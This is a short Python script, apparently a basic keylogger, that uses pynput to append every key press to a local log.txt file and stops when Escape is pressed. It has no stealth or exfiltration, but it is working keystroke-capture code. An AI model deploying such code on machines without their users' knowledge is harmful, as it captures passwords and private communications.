from pynput.keyboard import Listener, Key

def log_key(key):
    key_str = str(key).replace("'", "")  # Clean quotes

    # Handle special keys
    if key == Key.space:
        key_str = "[SPACE]"
    elif key == Key.enter:
        key_str = "[ENTER]\n"
    elif key == Key.backspace:
        key_str = "[BACKSPACE]"
    elif key == Key.esc:
        key_str = "[ESC]"
        with open("log.txt", "a") as f:
            f.write(key_str + " ")
        return False  # Stop the listener
    elif key_str.startswith("Key."):
        key_str = f"[{key_str.upper()}]"

    # Write to file
    with open("log.txt", "a") as f:
        f.write(key_str + " ")

# Start the listener
with Listener(on_press=log_key) as listener:
    listener.join()
